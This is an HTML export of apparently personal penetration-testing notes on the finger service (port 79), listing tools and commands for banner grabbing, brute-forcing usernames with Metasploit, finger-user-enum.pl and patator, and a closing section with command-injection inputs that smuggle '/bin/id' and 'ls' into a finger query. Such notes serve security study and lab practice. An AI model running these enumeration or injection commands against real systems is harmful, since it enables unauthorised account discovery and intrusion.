<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>79 - Finger</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Port 79 - Finger</h1></strong><br />Finger is legitimate command on unix machines to check who&#39;s logged in/who last logged into the box. As a pentester, you can finger to brute force for users on the system. There&#39;s also some bugs with finger - command execution might be possible<br /><br /><strong><h2>## Checklist</h2></strong><br />• Grab banner &amp; check version<br />   ◇ <code>nc 10.11.0.4 79 -v</code><br />• Check for exploits<br />• Bruteforce for users<br />   ◇ <code>use auxiliary/scanner/finger/finger_users</code> (uses a number of tricks apparently?)<br />   ◇ <code>finger-user-enum.pl</code><br />   ◇ <code>patator</code><br />• Test for command execution<br />• Check who&#39;s logged on<br />   ◇ <code>finger @10.10.10.76</code><br />• Finger a user<br />   ◇ <code>finger root@10.10.10.76</code><br /><br /><strong><h2>## Enumerate Users</h2></strong><br />• Port 79/finger can be used to enumerate users AND distinguish system users from legitimate users, <br />   ◇ because it will find the shell and /home directories of each of the bruteforced users<br />   ◇ grep for /home to find real system users, or look for terminal log ons<br />      ▪ <code>pts</code> is ssh<br />      ▪ <code>tty</code> is physical<br /><br />Wordlists<br />• <code>/usr/share/wordlists/metasploit/unix_users.txt</code><br />• <code>/usr/share/seclists/Usernames/Names/names.txt</code><br />   ◇ there&#39;s 70,943 names in here O_O<br /><br /><strong><h3>### finger-user-enum.pl</h3></strong><br />• Written by pentestmonkey<br />• <a href="https://raw.githubusercontent.com/pentestmonkey/finger-user-enum/master/finger-user-enum.pl">https://raw.githubusercontent.com/pentestmonkey/finger-user-enum/master/finger-user-enum.pl</a><br />• Output is dogshit (has line wrapping with extremely long lines)<br />• To fix output, pipe the command to <code>less -S</code> to get rid of the line wrapping, and output it to a text file, then follow the output of the text file with <code>tail -f<br /></code>   ◇ <code>./finger-user-enum.pl &lt;command&gt; | less -S &gt; finger.txt<br /></code>   ◇ <code>tail -f finger.txt</code><br /><br /><code>./finger-user-enum.pl -U /usr/share/wordlists/metasploit/unix_users.txt -t 10.0.0.1 | less -S &gt; finger.txt</code><br /><code>tail -f finger.txt</code><br /><br /><strong><h3>### metasploit</h3></strong><br /><code>use auxiliary/scanner/finger/finger_users</code><br /><br /><strong><h3>### Patator</h3></strong><br /><code>patator finger_lookup host=10.10.10.76 port=79 user=FILE0 0=/usr/share/seclists/Usernames/Names/names.txt -x ignore:fgrep=&#39;???&#39;</code><br /><br /><strong><h2>## Command Execution</h2></strong><br /><code>finger &quot;|/bin/id@example.com&quot;<br />finger &quot;|/bin/ls -a /@example.com&quot;</code><br /></div>
</body>
</html>
